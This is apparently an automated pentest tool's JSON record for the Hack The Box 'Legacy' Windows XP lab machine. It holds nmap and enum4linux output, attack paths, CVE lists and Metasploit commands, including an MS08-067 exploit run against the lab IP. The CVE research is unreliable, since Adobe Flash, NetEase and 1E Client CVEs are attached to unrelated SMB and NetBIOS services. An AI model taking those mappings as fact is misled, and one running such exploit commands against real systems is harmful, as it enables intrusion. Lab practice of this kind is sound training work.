{
    "pentest_name": "HTB__Legacy",
    "target_ip": "10.10.10.4",
    "can_load_from_ui": false,
    "nmap_output": "Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-01 19:55 BST\nNmap scan report for 10.10.10.4\nHost is up (0.071s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode: \n|   account_used: <blank>\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2024-04-06T23:53:21+03:00\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9c3f0 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 18.16 seconds",
    "attack_surface": [
        {
            "port_number": 135,
            "detected_service_version": "msrpc",
            "description": "Port 135 is used by the Microsoft Remote Procedure Call (RPC) service. RPC is a protocol that allows communication between a client and a server on a network. It is commonly used for various Windows services and applications."
        },
        {
            "port_number": 139,
            "detected_service_version": "netbios-ssn",
            "description": "Port 139 is used by the NetBIOS Session Service. NetBIOS is an API used by Windows systems for network communication. This service provides session-based communication between computers and is often used for file and printer sharing."
        },
        {
            "port_number": 445,
            "detected_service_version": "microsoft-ds",
            "description": "Port 445 is used by the Microsoft-DS (Directory Services) service. It is commonly associated with the Server Message Block (SMB) protocol, which is used for file sharing, printer sharing, and other network services on Windows systems."
        }
    ],
    "attack_paths": [
        {
            "path_name": "Path 1",
            "description": "Exploit the MSRPC service on port 135 to gain unauthorized access.",
            "service_name": "Microsoft Windows RPC",
            "version": "N/A"
        },
        {
            "path_name": "Path 2",
            "description": "Exploit the NetBIOS-SSN service on port 139 to gain unauthorized access.",
            "service_name": "Microsoft Windows netbios-ssn",
            "version": "N/A",
            "research": {
                "vulns": [
                    {
                        "cpe": "cpe:2.3:a:adobe:flash_player:27.0.0.187:*:*:*:*:microsoft_edge:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2005-4708",
                                "description": "Adobe Macromedia MX 2004 products, Captivate, Contribute 2, Contribute 3, and eLicensing client install the Macromedia Licensing Service with the Users group permitted to configure the service, including the path to executable, which allows local users to execute arbitrary code as Local System.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2005-4708",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-1654",
                                "description": "Interaction error between Adobe Flash and multiple Universal Plug and Play (UPnP) services allow remote attackers to perform Cross-Site Request Forgery (CSRF) style attacks by using the Flash navigateToURL function to send a SOAP message to a UPnP control point, as demonstrated by changing the primary DNS server.",
                                "weaknesses": [
                                    "CWE-352"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-1654",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2008-3873",
                                "description": "The System.setClipboard method in ActionScript in Adobe Flash Player 9.0.124.0 and earlier allows remote attackers to populate the clipboard with a URL that is difficult to delete and does not require user interaction to populate the clipboard, as exploited in the wild in August 2008.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2008-3873",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2010-0209",
                                "description": "Adobe Flash Player before 9.0.280 and 10.x before 10.1.82.76, and Adobe AIR before 2.0.3, allows attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors, a different vulnerability than CVE-2010-2213, CVE-2010-2214, and CVE-2010-2216.",
                                "weaknesses": [
                                    "CWE-94"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2010-0209",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2010-2213",
                                "description": "Adobe Flash Player before 9.0.280 and 10.x before 10.1.82.76, and Adobe AIR before 2.0.3, allows attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors, a different vulnerability than CVE-2010-0209, CVE-2010-2214, and CVE-2010-2216.",
                                "weaknesses": [
                                    "CWE-94"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2010-2213",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2010-2214",
                                "description": "Adobe Flash Player before 9.0.280 and 10.x before 10.1.82.76, and Adobe AIR before 2.0.3, allows attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors, a different vulnerability than CVE-2010-0209, CVE-2010-2213, and CVE-2010-2216.",
                                "weaknesses": [
                                    "CWE-94"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2010-2214",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2010-2215",
                                "description": "Adobe Flash Player before 9.0.280 and 10.x before 10.1.82.76, and Adobe AIR before 2.0.3, allows attackers to trick a user into (1) selecting a link or (2) completing a dialog, related to a \"click-jacking\" issue.",
                                "weaknesses": [
                                    "NVD-CWE-Other"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2010-2215",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2010-2216",
                                "description": "Adobe Flash Player before 9.0.280 and 10.x before 10.1.82.76, and Adobe AIR before 2.0.3, allows attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors, a different vulnerability than CVE-2010-0209, CVE-2010-2213, and CVE-2010-2214.",
                                "weaknesses": [
                                    "CWE-94"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2010-2216",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-4871",
                                "description": "An Out-of-bounds Read issue was discovered in Adobe Flash Player before 28.0.0.137. This vulnerability occurs because of computation that reads data that is past the end of the target buffer. The use of an invalid (out-of-range) pointer offset during access of internal data structure fields causes the vulnerability. A successful attack can lead to sensitive data exposure.",
                                "weaknesses": [
                                    "CWE-125"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-4871",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-4877",
                                "description": "A use-after-free vulnerability was discovered in Adobe Flash Player before 28.0.0.161. This vulnerability occurs due to a dangling pointer in the Primetime SDK related to media player's quality of service functionality. A successful attack can lead to arbitrary code execution.",
                                "weaknesses": [
                                    "CWE-416"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-4877",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-4878",
                                "description": "A use-after-free vulnerability was discovered in Adobe Flash Player before 28.0.0.161. This vulnerability occurs due to a dangling pointer in the Primetime SDK related to media player handling of listener objects. A successful attack can lead to arbitrary code execution. This was exploited in the wild in January and February 2018.",
                                "weaknesses": [
                                    "CWE-416"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-4878",
                                "exploit_info_links": [
                                    "https://github.com/B0fH/CVE-2018-4878",
                                    "https://github.com/HuanWoWeiLan/SoftwareSystemSecurity-2019",
                                    "https://github.com/KathodeN/CVE-2018-4878",
                                    "https://github.com/vysecurity/CVE-2018-4878",
                                    "https://github.com/ydl555/CVE-2018-4878-",
                                    "https://github.com/SyFi/CVE-2018-4878",
                                    "https://github.com/hybridious/CVE-2018-4878",
                                    "https://github.com/ydl555/CVE-2018-4878"
                                ]
                            },
                            {
                                "cve_id": "CVE-2018-4944",
                                "description": "Adobe Flash Player versions 29.0.0.140 and earlier have an exploitable type confusion vulnerability. Successful exploitation could lead to arbitrary code execution in the context of the current user.",
                                "weaknesses": [
                                    "CWE-704"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-4944",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-12825",
                                "description": "Adobe Flash Player 30.0.0.134 and earlier have a security bypass vulnerability. Successful exploitation could lead to security mitigation bypass.",
                                "weaknesses": [
                                    "NVD-CWE-noinfo"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-12825",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-12826",
                                "description": "Adobe Flash Player 30.0.0.134 and earlier have an out-of-bounds read vulnerability. Successful exploitation could lead to information disclosure.",
                                "weaknesses": [
                                    "CWE-125"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-12826",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-12827",
                                "description": "Adobe Flash Player 30.0.0.134 and earlier have an out-of-bounds read vulnerability. Successful exploitation could lead to information disclosure.",
                                "weaknesses": [
                                    "CWE-125"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-12827",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-12828",
                                "description": "Adobe Flash Player 30.0.0.134 and earlier have a \"use of a component with a known vulnerability\" vulnerability. Successful exploitation could lead to privilege escalation.",
                                "weaknesses": [
                                    "NVD-CWE-noinfo"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-12828",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2018-15982",
                                "description": "Flash Player versions 31.0.0.153 and earlier, and 31.0.0.108 and earlier have a use after free vulnerability. Successful exploitation could lead to arbitrary code execution.",
                                "weaknesses": [
                                    "CWE-416"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-15982",
                                "exploit_info_links": [
                                    "https://github.com/jas502n/CVE-2018-15982_EXP_IE",
                                    "https://github.com/kphongagsorn/adobe-flash-cve2018-15982",
                                    "https://github.com/Ridter/CVE-2018-15982_EXP",
                                    "https://github.com/FlatL1neAPT/CVE-2018-15982",
                                    "https://github.com/scanfsec/CVE-2018-15982",
                                    "https://github.com/Ormicron/CVE-2018-15982_PoC",
                                    "https://github.com/SyFi/CVE-2018-15982"
                                ]
                            },
                            {
                                "cve_id": "CVE-2018-15983",
                                "description": "Flash Player versions 31.0.0.153 and earlier, and 31.0.0.108 and earlier have an insecure library loading (dll hijacking) vulnerability. Successful exploitation could lead to privilege escalation.",
                                "weaknesses": [
                                    "CWE-426"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2018-15983",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2019-7845",
                                "description": "Adobe Flash Player versions 32.0.0.192 and earlier, 32.0.0.192 and earlier, and 32.0.0.192 and earlier have an use after free vulnerability. Successful exploitation could lead to arbitrary code execution.",
                                "weaknesses": [
                                    "CWE-416"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2019-7845",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2020-3757",
                                "description": "Adobe Flash Player versions 32.0.0.321 and earlier, 32.0.0.314 and earlier, 32.0.0.321 and earlier, and 32.0.0.255 and earlier have a type confusion vulnerability. Successful exploitation could lead to arbitrary code execution.",
                                "weaknesses": [
                                    "CWE-843"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2020-3757",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2020-9746",
                                "description": "Adobe Flash Player version 32.0.0.433 (and earlier) are affected by an exploitable NULL pointer dereference vulnerability that could result in a crash and arbitrary code execution. Exploitation of this issue requires an attacker to insert malicious strings in an HTTP response that is by default delivered over TLS/SSL.",
                                "weaknesses": [
                                    "CWE-476"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2020-9746",
                                "exploit_info_links": []
                            }
                        ]
                    }
                ],
                "references": [],
                "exploitdb": {
                    "title": "Microsoft Windows 95/98 - NetBIOS NULL Name"
                }
            },
            "steps": [
                {
                    "step_name": "Enumerate SMB shares",
                    "tool_name": "enum4linux",
                    "description": "Use the enum4linux tool to enumerate SMB shares on the target machine and gather information about the system.",
                    "command": "enum4linux -a 10.10.10.4",
                    "command_description": "Enumerate SMB shares on the target machine and gather information about the system using enum4linux.",
                    "output": "Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Apr  1 21:13:13 2024\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.10.10.4\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ================================================== \n|    Enumerating Workgroup/Domain on 10.10.10.4    |\n ================================================== \n[+] Got domain/workgroup name: HTB\n\n ========================================== \n|    Nbtstat Information for 10.10.10.4    |\n ========================================== \nLooking up status of 10.10.10.4\n\tLEGACY          <00> -         B <ACTIVE>  Workstation Service\n\tHTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n\tLEGACY          <20> -         B <ACTIVE>  File Server Service\n\tHTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections\n\tHTB             <1d> -         B <ACTIVE>  Master Browser\n\t..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser\n\n\tMAC Address = 00-50-56-B9-C3-F0\n\n =================================== \n|    Session Check on 10.10.10.4    |\n =================================== \n[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests."
                },
                {
                    "step_name": "Exploit MS08-067",
                    "tool_name": "Metasploit",
                    "description": "Use Metasploit to exploit the MS08-067 vulnerability in the target machine's NetBIOS service. Search for the appropriate exploit module and set the necessary options. Execute the exploit to gain unauthorized access to the system.",
                    "command": "msfconsole -qx \"search smb; use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.4; run\"",
                    "command_description": "Use Metasploit to search for SMB-related modules, select the exploit module 'ms08_067_netapi', set the target IP address to 10.10.10.4, and execute the exploit to gain unauthorized access to the system."
                },
                {
                    "step_name": "Run Metasploit Exploit",
                    "description": "Use the discovered Metasploit module to exploit the target service.",
                    "tool_name": "Metasploit"
                }
            ]
        },
        {
            "path_name": "Path 3",
            "description": "Exploit the Microsoft-DS service on port 445 to gain unauthorized access.",
            "service_name": "Windows XP microsoft-ds",
            "version": "N/A",
            "research": {
                "vulns": [
                    {
                        "cpe": "cpe:2.3:a:163:netease_mail_master:4.14.1.1004:*:*:*:*:windows:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2020-24161",
                                "description": "Guangzhou NetEase Mail Master 4.14.1.1004 on Windows has a DLL hijacking vulnerability. Attackers can use this vulnerability to execute malicious code.",
                                "weaknesses": [
                                    "CWE-427"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2020-24161",
                                "exploit_info_links": []
                            }
                        ]
                    },
                    {
                        "cpe": "cpe:2.3:a:1e:client:4.1.0.267:*:*:*:*:windows:*:*",
                        "cves": [
                            {
                                "cve_id": "CVE-2020-16268",
                                "description": "The MSI installer in 1E Client 4.1.0.267 and 5.0.0.745 allows remote authenticated users and local users to gain elevated privileges via the repair option. This applies to installations that have a TRANSFORM (MST) with the option to disable the installation of the Nomad module. An attacker may craft a .reg file in a specific location that will be able to write to any registry key as an elevated user.",
                                "weaknesses": [
                                    "CWE-74",
                                    "CWE-668"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2020-16268",
                                "exploit_info_links": []
                            },
                            {
                                "cve_id": "CVE-2020-27643",
                                "description": "The %PROGRAMDATA%\\1E\\Client directory in 1E Client 5.0.0.745 and 4.1.0.267 allows remote authenticated users and local users to create and modify files in protected directories (where they would not normally have access to create or modify files) via the creation of a junction point to a system directory. This leads to partial privilege escalation.",
                                "weaknesses": [
                                    "CWE-59"
                                ],
                                "link": "https://nvd.nist.gov/vuln/detail/CVE-2020-27643",
                                "exploit_info_links": []
                            }
                        ]
                    }
                ],
                "references": [],
                "exploitdb": {
                    "title": "Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &#039;EternalBlue&#039; SMB Remote Code Execution (MS17-010)"
                }
            },
            "steps": [
                {
                    "step_name": "Port Scan",
                    "tool_name": "Nmap",
                    "description": "Perform a port scan using Nmap to identify open ports and services on the target machine.",
                    "command": "nmap -p- -sV 10.10.10.4",
                    "command_description": "Perform a port scan using Nmap to identify open ports and services on the target machine.",
                    "output": "Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-01 19:58 BST\nNmap scan report for 10.10.10.4\nHost is up (0.072s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.49 seconds"
                },
                {
                    "step_name": "Service Enumeration",
                    "tool_name": "Nmap",
                    "description": "Enumerate the identified services (Microsoft Windows RPC, netbios-ssn, and microsoft-ds) using Nmap to gather more information about them.",
                    "command": "nmap -p 135,139,445 -sV -A 10.10.10.4",
                    "command_description": "This command will use Nmap to perform service enumeration on the target IP address (10.10.10.4). It will scan ports 135, 139, and 445, and use aggressive service detection (-A) to gather detailed information about the identified services (Microsoft Windows RPC, netbios-ssn, and microsoft-ds).",
                    "output": "Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-01 20:00 BST\nNmap scan report for 10.10.10.4\nHost is up (0.072s latency).\n\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows XP microsoft-ds\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: 5d00h27m40s, deviation: 2h07m16s, median: 4d22h57m40s\n| smb-security-mode: \n|   account_used: <blank>\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2024-04-06T23:57:58+03:00\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9c3f0 (VMware)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.26 seconds"
                },
                {
                    "step_name": "Exploit SMB Service",
                    "tool_name": "Metasploit",
                    "description": "Use Metasploit to search for SMB-specific exploits and select a suitable one to exploit the Microsoft-DS service on port 445.",
                    "command": "msfconsole -qx \"search name:microsoft-ds; exit;\"",
                    "command_description": "Use this command to find the corresponding module that would potentially exploit the target service."
                },
                {
                    "step_name": "Run Metasploit Exploit",
                    "description": "Use the discovered Metasploit module to exploit the target service.",
                    "tool_name": "Metasploit"
                },
                {
                    "step_name": "Exploit Selected Vulnerability",
                    "tool_name": "Metasploit",
                    "description": "Execute the selected exploit from the previous step to gain unauthorized access and achieve a remote shell on the target machine."
                }
            ],
            "notes": [
                "The target is not vulnerable to Eternal Blue.",
                "The target is not vulnerable to the Metasploit ms05_017_msmq exploit.",
                "Let's focus on finding SMB specific Metasploit modules."
            ]
        }
    ],
    "extra_details": {
        "os_name": "Windows XP",
        "hostname": "legacy",
        "workgroup": "HTB"
    },
    "can_resume_from_ui": true
}